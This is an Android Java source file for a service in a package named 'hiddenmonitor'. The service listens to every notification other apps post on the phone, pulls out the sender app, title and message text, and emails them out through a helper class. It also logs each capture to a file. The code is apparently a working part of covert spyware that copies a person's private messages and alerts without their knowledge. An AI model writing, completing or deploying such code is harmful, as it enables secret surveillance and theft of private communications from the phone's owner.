package com.example.hiddenmonitor;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

public class NotificationMonitor extends NotificationListenerService {
    
    private static final String TAG = "NotificationMonitor";
    private EmailSender emailSender;
    
    @Override
    public void onCreate() {
        super.onCreate();
        emailSender = new EmailSender(this);
    }
    
    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        String packageName = sbn.getPackageName();
        CharSequence title = sbn.getNotification().extras.getCharSequence("android.title");
        CharSequence text = sbn.getNotification().extras.getCharSequence("android.text");
        
        // Don't monitor our own notifications
        if (!packageName.contains("hiddenmonitor") && title != null) {
            String subject = "🔔 Notification from " + packageName;
            String body = "App: " + packageName + "\n" +
                         "Title: " + title + "\n" +
                         "Content: " + (text != null ? text : "No content") + "\n" +
                         "Time: " + System.currentTimeMillis();
            
            emailSender.sendEmail(subject, body);
            FileLogger.log(this, "Notification from: " + packageName);
        }
    }
    
    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        // Optional: log when notification is removed
    }
}
